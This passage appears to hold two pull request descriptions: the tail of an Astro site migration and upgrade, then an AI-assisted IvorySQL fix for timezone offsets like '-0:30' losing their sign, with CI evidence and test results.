- **Content Layer migration.** Replace `src/content/config.ts` with `src/content.config.ts` using `glob()` loaders (same Zod schema). Swap `post.slug` for `post.id` and `await post.render()` for `render(post)` from `astro:content` in the four pages and two feeds. The glob loader reproduces the existing `/blog/<year>/<slug>` URL shape, so no redirects are needed.
- **Astro 7 upgrade.** `astro@^7.3.4`, `@astrojs/mdx@^8`, `@astrojs/sitemap@^3.7.4`, `@astrojs/rss@^4.0.19`, `@astrojs/check@^0.9.10`, plus `@lucide/astro@^1.47.0` and Tailwind `^4.3.3` to satisfy the new peer ranges. Raise `.node-version` to `22.12.0` (the host reads this file) and declare `engines.node: ">=22.12.0"` in `package.json`, matching Astro 7.3.4's own engines.
- **Formatting baseline.** Run Prettier across the repo so `format:check` starts clean, with a new `.prettierignore` entry for one MDX file whose inline `<ruby>` markup the formatter cannot stabilize (its output oscillates between runs, so `--check` can never pass).
- **Backlog.** Mark items 1–3 complete in `TODO.md`.

`z` is now imported from `astro/zod` instead of the deprecated `astro:content` re-export that Astro 8 will drop.

## Validation

- `pnpm check` — 0 errors, 0 warnings (1 pre-existing `MediaQueryList.addListener` deprecation hint in `ThemeSelect.astro`, unchanged from the baseline).
- `pnpm format:check` — clean.
- `pnpm build` — 72 pages built.
- Emitted route list under `dist/` byte-identical to a pre-change baseline build.
- `feed.xml`, `derived-data-feed.xml`, and `sitemap-0.xml` byte-identical modulo build timestamps; RSS item bodies still populated.
- Rendered text of every page compared against a pristine pre-change baseline build: the only differences are the remark smart-dash conversion (`---` → `—`) in prose and equivalent HTML entity encodings introduced by the newer unified/remark stack inside Astro 7. Class token sets per element are unchanged (Prettier reorders Tailwind classes; cascade order is preserved).
- `pnpm preview` spot-checks: `/`, `/blog/`, a blog post, `/derived-data/`, a Derived Data post, `/feed.xml`, `/experiments/twil/`, and the `/blog/1` redirect all return 200 with correct content.

## Exclusions

- No behavioural or visual changes intended; the smart-dash conversion affects typography of em dashes in prose only.
- The Astro 6 TODO-era notes and backlog items 4–5 (Prettier majors, TypeScript 6) are out of scope.

author: yyqdbngt
body:
### Which Issue(s) This PR Fixes

Fixes #2224

### Brief Description

`ora_make_timezone()` in
`contrib/ivorysql_ora/src/builtin_functions/datetime_datatype_functions.c` (master, lines 1556-1569)
parses a numerically specified timezone offset with `sscanf(*newval, "%d:%d", &hours, &minu)` and
takes the sign of the offset from the parsed hour field:

```c
	if (hours < 0)
		minu *= -1;
	gmtoffset = -(hours * SECS_PER_HOUR + minu * SECS_PER_MINUTE);
```

`%d` cannot see the sign of a zero hour field, so `"-0:30"` parses as `hours = 0, minu = 30` and
the sign is silently dropped: the offset is read as UTC+00:30 instead of UTC-00:30.  Both callers
are affected:

* `TZ_OFFSET('-0:30')` (line 662) reports the mirrored offset `+00:30`;
* `FROM_TZ(ts, '-0:30')` (line 759) places the timestamp half an hour on the wrong side of GMT.

That it is the sign and not the offset convention is shown by the asymmetry inside one run:
`TZ_OFFSET('-1:30')` correctly returns `-01:30` (the sign survives in `hours = -1`), while
`TZ_OFFSET('-0:30')` returns `+00:30`.

The patch reads the sign from the string instead (skipping leading whitespace exactly as `sscanf()`
does) and applies it to the magnitude, so an offset west of GMT becomes the positive number of
seconds west of GMT that `pg_tzset_offset()` expects.  The existing validation is unchanged,
including the `-12:59 .. +14:00` bounds and the `+14:05` rejection, and the name-based path
(`TZ_OFFSET('Asia/Shanghai')`, `FROM_TZ(ts, 'GMT')`) is untouched.

Only `contrib/ivorysql_ora` is touched, and the pull request branch contains no workflow change.

### How Did You Test This Change?

IvorySQL cannot be built on this machine (no Linux, no WSL, no Docker), so both runs below come
from this fork's GitHub Actions.  They run the repository's own target on a branch pair whose trees
are identical except for the production change (`git diff --stat iv-red/ora-tz-offset-sign
iv-fix/ora-tz-offset-sign` lists only `datetime_datatype_functions.c`; the SQL test and the expected
file are byte-identical on both branches):

    make -C contrib/ivorysql_ora oracle-check ORA_REGRESS='ora_datetime ora_datetime_datatype_functions'

The new cases are appended to the existing `ora_datetime` regression test (a file no other pull
request in flight modifies), and `expected/ora_datetime.out` was taken byte for byte from the green
run's `results/ora_datetime.out` (LF blob sha256
b1c9ebb46d3b58b1dbbd37893adf1c02c21a27c3025e3d6969ca6d2fd476583b); it is not hand-written.
`ora_datetime_datatype_functions` is unmodified upstream and also passes in the green run, so the
pre-existing `TZ_OFFSET('+14:05')` / `FROM_TZ(ts,'3:00')` behaviour is not regressed.

* Red branch `iv-red/ora-tz-offset-sign` (d7249c33fbf1) = new cases only, no production change -
  FAILS: https://github.com/yyqdbngt/IvorySQL/actions/runs/35839028212
* Fix branch `iv-fix/ora-tz-offset-sign` (8a88097881b1) = the same tree plus this fix - PASSES:
  https://github.com/yyqdbngt/IvorySQL/actions/runs/35839037427

### Overlap with our other open pull requests

`contrib/ivorysql_ora/src/builtin_functions/datetime_datatype_functions.c` is also edited by #2208
(NUMTOYMINTERVAL rounding). `git merge-tree --write-tree <this head> <pr2208 head>` returns exit 0: the two
changes are in different functions (`ora_tz_offset()` and `ora_from_tz()` here, `numtoyminterval()` there), and
the two regression pairs are separate files (`ora_datetime.sql`/`ora_datetime.out` here,
`ora_datetime_datatype_functions.*` there), so neither merge order needs a human.

### Evidence

Quoted from the red run's `contrib/ivorysql_ora/regression.diffs` (expected vs actual), next to what
the fixed build returns for the same statements:

| statement | red run (no fix) | fixed run |
| --- | --- | --- |
| `TZ_OFFSET('-0:30')` | `+00:30` | `-00:30` |
| `TZ_OFFSET('-0:30') = '+00:30'` | `t` | `f` |
| `TZ_OFFSET('-0:30') = '-00:30'` | `f` | `t` |
| `FROM_TZ(ts,'-0:30') = FROM_TZ(ts,'+0:30')` | `t` | `f` |
| `FROM_TZ(ts,'-0:30') > FROM_TZ(ts,'0:00')` | `f` | `t` |
| `TZ_OFFSET('+0:30')` | `+00:30` | `+00:30` (unaffected) |
| `TZ_OFFSET('-1:30') = '-01:30'` | `t` | `t` (sign already worked for a non-zero hour) |
| `TZ_OFFSET('-1:30') = '+01:30'` | `f` | `f` |
| `TZ_OFFSET('-12:59')` | `-12:59` | `-12:59` (existing case, unaffected) |

The last four rows are the control cases: they are identical on both runs, so the diff is confined
to offsets whose hour field is zero.  With the fix, `-0:30` is one hour away from `+0:30` instead of
being the same offset under two names.

<!-- This is an auto-generated comment: release notes by coderabbit.ai -->

## Summary by CodeRabbit

* **Bug Fixes**
  * Corrected handling of negative timezone offsets when the hour component is zero. `TZ_OFFSET` now preserves the negative sign for values such as `-0:30`, and `FROM_TZ` applies these offsets in the correct direction. Comparisons and ordering of timestamps created with negative, positive, and zero half-hour offsets now reflect their actual times.

<!-- end of auto-generated comment: release notes by coderabbit.ai -->

### AI usage disclosure

This contribution was created with AI assistance throughout (approximately 100%) using OpenAI Codex (GPT-5). AI was used for analysis, implementation, test design, verification planning, and drafting the pull request description.
